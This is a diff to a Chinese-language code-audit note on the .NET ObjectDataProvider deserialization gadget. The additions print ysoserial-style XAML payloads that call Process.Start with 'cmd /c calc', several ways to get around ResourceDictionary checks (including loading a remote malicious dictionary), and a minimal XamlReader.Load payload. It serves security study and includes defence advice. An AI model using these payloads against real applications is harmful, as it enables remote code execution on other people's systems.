@@ -154,6 +154,120 @@ private void InvokeMethodOnInstance()
 
 > `IsRefreshDeferred` 可通过 `DeferRefresh()`/`EndDeferRefresh()` 控制批量更新时的刷新时机。
 
+## ConstructorParameters 与实例化调用链
+
+### ConstructorParameters 属性
+
+ObjectDataProvider 提供 `ConstructorParameters` 属性支持对类的构造方法初始化传值：
+
+```xml
+<ObjectDataProvider x:Key="obj0" ObjectType="{x:Type local:QueryData}">
+    <ObjectDataProvider.ConstructorParameters>
+        <sys:String>notepad</sys:String>
+    </ObjectDataProvider.ConstructorParameters>
+</ObjectDataProvider>
+```
+
+- 对应后端类构造函数 `public QueryData(string application)`
+- 实例化时通过反射调用带参构造函数，参数来自 `ConstructorParameters` 集合
+- 结合 `MethodName` 可实现：构造实例 → 调用实例方法的完整链
+
+### 实例化流程对比
+
+| 模式 | 实例化时机 | 适用场景 |
+|------|------------|----------|
+| `ObjectType` + `ConstructorParameters` | `QueryWorker` 内部 `Activator.CreateInstance(_objectType, _constructorParameters.ToArray())` | 需要构造函数参数的类 |
+| `ObjectType` 无参数 | `Activator.CreateInstance(_objectType)` | 无参构造函数 |
+| `ObjectInstance` | 直接使用已有实例 | 已有对象实例，跳过构造 |
+
+## ResourceDictionary 与 XAML 载荷结构
+
+### 标准 ResourceDictionary 载荷（ysoserial 风格）
+
+```xml
+<ResourceDictionary
+    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+    xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml"
+    xmlns:b="clr-namespace:System;assembly=mscorlib"
+    xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
+    <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
+        <ObjectDataProvider.MethodParameters>
+            <b:String>cmd</b:String>
+            <b:String>/c calc</b:String>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</ResourceDictionary>
+```
+
+关键点解析：
+- `xmlns:c="clr-namespace:System.Diagnostics;assembly=system"`：引入 System.Diagnostics 命名空间，`assembly=system` 对应 `System.dll`
+- `d:Type c:Process`：XAML 标记扩展，等同于 `typeof(System.Diagnostics.Process)`
+- `d:Key=""`：空键值，作为资源字典中的匿名资源
+- `MethodParameters` 包含两个 `b:String`：对应 `Process.Start(string fileName, string arguments)` 两个参数
+
+### ResourceDictionary 绕过技巧
+
+#### 使用 Window.Resources 替代
+
+```xml
+<Window.Resources>
+    <ObjectDataProvider x:Key="obj" ObjectType="{x:Type process:Process}" MethodName="Start">
+        <ObjectDataProvider.MethodParameters>"calc"</ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</Window.Resources>
+<Grid DataContext="{Binding Source={StaticResource obj}}"></Grid>
+```
+
+- 无需 `ResourceDictionary` 标签，直接在任意 `FrameworkElement.Resources` 中定义
+- `x:Key` 必须非空，供 `StaticResource` 引用
+
+#### 使用 Application.Resources 全局资源
+
+```xml
+<Application.Resources>
+    <ObjectDataProvider x:Key="payload" ObjectType="{x:Type sys:Process}" MethodName="Start">
+        <ObjectDataProvider.MethodParameters>
+            <sys:String>cmd</sys:String>
+            <sys:String>/c calc</sys:String>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</Application.Resources>
+```
+
+- 作用域更广，适合在 `App.xaml` 或动态加载的资源字典中植入
+
+#### MergedDictionaries 外部引入绕过
+
+```xml
+<Window.Resources>
+    <ResourceDictionary>
+        <ResourceDictionary.MergedDictionaries>
+            <ResourceDictionary Source="Dictionary1.xaml"/>
+        </ResourceDictionary.MergedDictionaries>
+    </ResourceDictionary>
+</Window.Resources>
+```
+
+- `Dictionary1.xaml` 包含恶意 `ObjectDataProvider`
+- 利用相对/绝对路径、文件协议、`pack://` 协议加载远程载荷
+
+#### 最小化载荷（去除命名空间前缀）
+
+```xml
+<ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+                    xmlns:sys="clr-namespace:System;assembly=mscorlib"
+                    xmlns:diag="clr-namespace:System.Diagnostics;assembly=System"
+                    ObjectType="{x:Type diag:Process}" MethodName="Start">
+    <ObjectDataProvider.MethodParameters>
+        <sys:String>cmd</sys:String>
+        <sys:String>/c calc</sys:String>
+    </ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>
+```
+
+- 直接作为 XAML 片段通过 `XamlReader.Load()` 反序列化
+- 无需完整 `ResourceDictionary` 包裹
+
 ## 实战利用：基于 Process.Start 的 WebShell 变种
 
 ### 核心执行载荷
@@ -222,6 +336,17 @@ provider.MethodName = "Start";
     → RCE
 ```
 
+## ysoserial.net 载荷结构对应关系
+
+| ysoserial 字段 | ObjectDataProvider 属性 | 说明 |
+|----------------|-------------------------|------|
+| `TypeName` | `ObjectType` (via `Type.GetType`) | 完全限定类型名含程序集强签 |
+| `MethodName` | `MethodName` | 目标方法名 |
+| `Parameters` | `MethodParameters` | 参数列表，按顺序对应方法签名 |
+| `_constructorParameters` | `ConstructorParameters` | 构造函数参数，用于 `Activator.CreateInstance` |
+
+ysoserial 生成的 `ObjectDataProvider` Gadget 最终序列化为 `ResourceDictionary` 包裹的 XAML，或直接作为 `XamlReader.Load` 输入。
+
 ## 防御与检测建议
 
 1. **禁止不受信任的反序列化**
@@ -251,7 +376,9 @@ provider.MethodName = "Start";
 
 ## 参考资料
 
-- 原文：《.NET高级代码审计(第13课)反序列化Gadget之ObjectDataProvider完结篇》  
+- 原文：《.NET高级代码审计(第12课) Gadget之详解ObjectDataProvider》  
+  <http://mp.weixin.qq.com/s?__biz=Mzg4Njc1MTIzMw==&mid=2247484604&idx=1&sn=09cf5b30df0238c09650dac99af650a0>
+- 后续篇：《.NET高级代码审计(第13课)反序列化Gadget之ObjectDataProvider完结篇》  
   <http://mp.weixin.qq.com/s?__biz=Mzg4Njc1MTIzMw==&mid=2247484651&idx=1&sn=279efbb8b93b66259ebd3cd766a138a4>
 - Microsoft Docs: [ObjectDataProvider Class](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider)
 - .NET Reference Source: [ObjectDataProvider.cs](https://referencesource.microsoft.com/#PresentationFramework/MS/Internal/Data/ObjectDataProvider.cs)
@@ -259,4 +386,4 @@ provider.MethodName = "Start";
 
 ## 来源
 
-- [0x6270安全团队-202203-202304_33](../sources/0x6270安全团队-202203-202304_33.md)
+- [0x6270安全团队-202203-202304_36](../sources/0x6270安全团队-202203-202304_36.md)
